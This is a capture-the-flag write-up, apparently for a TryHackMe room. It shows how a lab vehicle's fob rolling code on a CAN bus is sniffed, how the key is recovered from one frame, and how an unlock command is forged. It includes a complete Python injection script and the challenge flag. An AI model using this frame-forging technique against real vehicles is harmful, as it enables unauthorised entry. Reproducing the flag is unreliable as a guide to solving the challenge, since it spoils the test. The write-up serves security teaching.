# Phantom Fob: CAN Bus Rolling-Code Forgery

**Author:** mr-destroyer/zim

A CTF writeup for a demo-vehicle CAN bus challenge. The premise:

> Modern cars have an internal network called the CAN Bus. Every part of the car:
> doors, dashboard, engine, talks to every other part by broadcasting little
> messages onto this shared wire. In this room you're plugged into the CAN bus of
> a demo vehicle. You've been given a key fob that can Lock the car and sound the
> Horn, but has no Unlock button. The manufacturer claims the unlock command
> "can't be copied." Your job is to watch the car's messages, work out how the
> door commands are built, and craft the Unlock message yourself.

**Target:** `10.49.141.64`
**Flag:** `THM{C4r_H4cking_is_kind4_c00l}`

---

## TL;DR

The fob's "uncopyable" rolling code is derived from a counter that the vehicle
**broadcasts in the clear** on CAN ID `0x565`. Worse, the fob's own frames leak
both halves of the authentication: a single sniffed press is enough to recover
the code and the key, after which *any* command can be minted, including the
Unlock the fob doesn't have.

Contents:

- [`note.md`](note.md): protocol reference and reverse-engineering notes
- [`steps.md`](steps.md): the walkthrough, start to finish

---

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 4000 -T4 10.49.141.64
```

```
22/tcp    open  ssh
8080/tcp  open  http-proxy
29536/tcp open  unknown
```

- **8080**: a Flask/Werkzeug "Instrument Cluster" dashboard. Routes: `/`
  (UI), `/events` (SSE state stream), `/press` (fob buttons).
- **29536**: socketcand's default port. That's **the CAN bus itself**, and it
  matches the challenge premise of being "plugged into the bus".

The dashboard exposes a fob with exactly four buttons: Lock, Horn, Immobiliser
Arm, Immobiliser Disarm. No Unlock. A fuzz of ~57k candidate control names on
`/press` turned up nothing hidden (unknown names return HTTP 400, valid names
HTTP 200), so the unlock genuinely has to be crafted on the wire.

The SSE stream leaks the bus frame rate (`fps: 226`), confirming the web app is
itself just a bus listener:

```json
{"locked": true, "immob": true, "horn": false, "speed": 33.97,
 "turn": 0, "fps": 226, "seen_ids": 2048, "flag": ""}
```

---

## Getting on the bus

socketcand speaks a tiny line protocol over TCP:

```
server → < hi >
client → < open vcan0 >
server → < ok >
client → < rawmode >
server → < ok >
```

Frames then stream as `< frame <ID> <sec.usec> <DATA> >`, and injection uses
lowercase space-separated hex:

```
< send 421 8 1e e5 2d 99 b6 59 3f 76 >
```

Gotchas: no colons in the commands (`< open vcan0 >`, not `< open: vcan0 >`),
and injected frames loop back to every connected client, so you can verify your
own injections by watching on a second connection.

---

## Decoding the bus

| ID | Rate | Role |
|----|------|------|
| `0x39E` | ~5/s | vehicle state (doors / immobiliser / horn) |
| `0x421` | per button press | the key fob |
| `0x565` | ~1.1/s | rolling value broadcast |
| `0x0E9`, `0x47B`, `0x59E`, `0x600`, … | | noise / other ECUs |

`0x39E` decodes cleanly:

```
01 01 00 A5 00 00 00 00
│  │  │  └── constant 0xA5
│  │  └───── horn
│  └──────── immobiliser (01 = armed)
└─────────── doors (00 = unlocked, 01 = locked)
```

**Dead end worth avoiding:** flooding `39E 000000A500000000` makes the web
dashboard *display* UNLOCKED, because the dashboard is only a bus listener. The
real car never changes state and no flag is released: `0x39E` is status, not
command.

---

## The fob frame (`0x421`)

Pressing each button and diffing the resulting frames gives:

| Button | byte 6 |
|--------|--------|
| Lock | `0xCD` |
| Horn | `0x3F` |
| Immobiliser Arm | `0xBF` |
| Immobiliser Disarm | `0x53` |

```
 b0  b1  b2  b3  b4  b5  b6  b7
 1e  e5  2d  99  b6  59  3f  76
 │   │   └───┘   │   │   │   └── constant 0x76
 │   │   const   │   │   └────── command
 │   │           │   └────────── rolling counter (+1 per press, 8-bit)
 │   │           └────────────── code (low byte)
 │   └────────────────────────── counter ^ key ^ command
 └────────────────────────────── code (high byte)
```

`b5` is a rolling counter that increments by exactly 1 per press. `b2b3 = 2D99`
and `b7 = 76` are constants. That leaves `b0`, `b1`, `b4`.

### Finding the structure

Across a few hundred presses, two patterns appear:

1. `b0` and `b4` always change **together**.
2. `b1` drifts inside those groups, tracking `b5` but not exactly.

Testing `b1` against the counter inside one group:

```
b5=5E → b1=B3   B3 ^ 5E = ED
b5=5F → b1=B2   B2 ^ 5F = ED
b5=60 → b1=8D   8D ^ 60 = ED    ← same constant
```

So **`b1 = counter XOR K`**, with `K` fixed inside a group.

### Where the rolling code comes from

Grouping presses by the `0x565` byte2 value observed at press time:

```
1734AB0000000000
34DAAC0000000000
C6C5AD0000000000
     └── byte2 increments by 1 per frame
```

- `(b0, b4)` is a **pure function of `565.b2`**: 150 groups, **0 impure**
- and it is **independent of the command**

Across capture sessions the same `b2` yields *different* codes, so the code
actually tracks the **full `0x565` counter** and is only valid while that byte2
value holds (~0.9 s).

A useful negative result: because the code depends on a live broadcast rather
than the frame contents, `(b0, b4)` is **not** a deterministic function of
`(counter, command)`: the same counter shows different codes in different
windows. That rules out static lookup tables and simple sum/xor/CRC checksums
(all of which were tried).

### Recovering the key

Comparing presses of *different commands* inside one `b2` window:

```
b2=AD   cmd 3F → K=86    86 ^ 3F = B9
        cmd CD → K=74    74 ^ CD = B9   ✓

b2=B0   cmd 53 → K=5A    5A ^ 53 = 09
        cmd BF → K=B6    B6 ^ BF = 09   ✓
        cmd CD → K=C4    C4 ^ CD = 09   ✓
```

So `K = key(b2) XOR command`, which means:

```
b1 = counter XOR key XOR command
key = b1 XOR counter XOR command      ← falls out of ONE sniffed frame
```

---

## Forging the unlock

With `code = (b0, b4)` and `key` in hand, mint a frame for any
`(counter, command)`:

```
b1' = counter' XOR key XOR command'

frame = [b0] [b1'] [2D] [99] [b4] [counter'] [command'] [76]
```

Two things that break a naive attempt:

1. **The counter and `b1` are linked.** Bumping `b5` without recomputing `b1`
   invalidates the frame. This is why simply flipping the command byte fails.
2. **The code expires with the `565` window.** Capture, derive and send inside
   the *same* window (~0.9 s). Sleeping between capture and send is too late.

Sanity-check with a command whose effect is visible first: forge
**Immobiliser Disarm** (`0x53`) and confirm the dashboard's immobiliser flips:

```
captured 17472D992197CD76  code=1721 key=1D ctr=97
forged   17D62D9921985376  →  immob: armed → disarmed   ✓
```

Then sweep all 256 command bytes (incrementing the counter per frame, all in one
window) to hit the unknown Unlock:

```python
for i in range(256):
    c   = (ctr + 1 + i) & 0xFF
    b1n = c ^ key ^ i
    send("421", "%02X%02X2D99%02X%02X%02X76" % (b0, b1n, b4, c, i))
```

The flag is released on the bus the moment the car unlocks:

```
THM{C4r_H4cking_is_kind4_c00l}
```

---

## Full exploit

```python
#!/usr/bin/env python3
import socket, re, time, json, urllib.request, threading

HOST, CAN_PORT, HTTP = "10.49.141.64", 29536, 8080
FRAME_RE = re.compile(r"< frame ([0-9A-Fa-f]+) ([0-9]+\.[0-9]+) ([0-9A-Fa-f]*) >")
frames, sse = [], []

def bus_conn():
    s = socket.create_connection((HOST, CAN_PORT), timeout=10)
    s.settimeout(0.05)
    s.sendall(b"< open vcan0 >\n"); time.sleep(0.8)
    s.sendall(b"< rawmode >\n");    time.sleep(0.4)
    return s

def watch(s):
    buf = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            continue
        if not d:
            return
        buf += d
        while b">" in buf:
            unit, buf = buf.split(b">", 1)
            m = FRAME_RE.search((unit + b">").decode("latin1"))
            if m:
                frames.append((time.time(), m.group(1).upper(), m.group(3).upper()))

def sse_reader():
    r = urllib.request.urlopen("http://%s:%d/events" % (HOST, HTTP), timeout=600)
    buf = b""
    while True:
        d = r.read(1)
        if not d:
            return
        buf += d
        if d == b"\n":
            line = buf.decode(errors="replace").strip(); buf = b""
            if line.startswith("data: "):
                j = json.loads(line[6:])
                sse.append((j.get("locked"), j.get("immob"), j.get("flag")))

def send_bus(s, cand_id, data_hex):
    b = [data_hex[i:i+2].lower() for i in range(0, len(data_hex), 2)]
    s.sendall(("< send %s %d %s >\n" % (cand_id, len(b), " ".join(b))).encode())

def press(btn):
    req = urllib.request.Request(
        "http://%s:%d/press" % (HOST, HTTP),
        data=json.dumps({"button": btn}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    urllib.request.urlopen(req, timeout=5).read()

def grab_fob(btn="LOCK"):
    """Press a button and return the resulting 0x421 frame."""
    n0 = len(frames)
    t0 = time.time()
    press(btn)
    while time.time() - t0 < 2.0:
        c = [d for t, i, d in frames[n0:] if i == "421"]
        if c:
            return c[-1]
    return None

def main():
    obs, inj = bus_conn(), bus_conn()
    threading.Thread(target=watch, args=(obs,), daemon=True).start()
    threading.Thread(target=sse_reader, daemon=True).start()
    time.sleep(3)

    press("IMMOB_ARM"); time.sleep(1.0)
    press("LOCK");      time.sleep(1.2)

    for _ in range(3):
        fd = grab_fob("LOCK")
        b0  = int(fd[0:2], 16)
        b1  = int(fd[2:4], 16)
        b4  = int(fd[8:10], 16)
        ctr = int(fd[10:12], 16)
        cmd = int(fd[12:14], 16)

        # the two secrets, recovered from one captured frame
        key = b1 ^ ctr ^ cmd

        # sweep every command byte inside the same 0x565 window
        for i in range(256):
            c   = (ctr + 1 + i) & 0xFF
            b1n = c ^ key ^ i
            send_bus(inj, "421", "%02X%02X2D99%02X%02X%02X76" % (b0, b1n, b4, c, i))

        time.sleep(1.2)
        locked, immob, flag = sse[-1]

        if flag:
            print("[+] FLAG:", flag)
            return

        press("LOCK"); time.sleep(0.8)

if __name__ == "__main__":
    main()
```

---

## Why it works

The manufacturer's "can't be copied" claim rests on a rolling code, and the
rolling value is broadcast in the clear on `0x565`. Worse, the fob hands over
the rest of the scheme with every press: `b1` is `counter XOR key XOR command`,
so `key = b1 XOR counter XOR command` falls straight out of a single sniffed
frame. Both halves of the authentication leak by design.

Nothing needed to be *cracked*. The real trick is timing: the code is only valid
while the `0x565` counter holds, so capture, derive and forge have to happen
inside the same ~0.9 s window.

---

## Lessons

- **Sniff before you cryptanalyse.** Hours went into checksums, CRCs and MAC
  brute-forces before the answer turned out to be "the key is broadcast in the
  clear one ID over".
- **Correlate, don't just diff.** The breakthrough came from grouping fob frames
  by an *external* value (`565.b2`) and testing group purity, not from studying
  the frame in isolation.
- **Mind the timing.** A rolling code tied to a live counter means replaying a
  capture a second later is already stale.
- **Status frames are not commands.** Faking `0x39E` fooled the dashboard
  completely and achieved nothing.

---

**Author:** mr-destroyer/zim
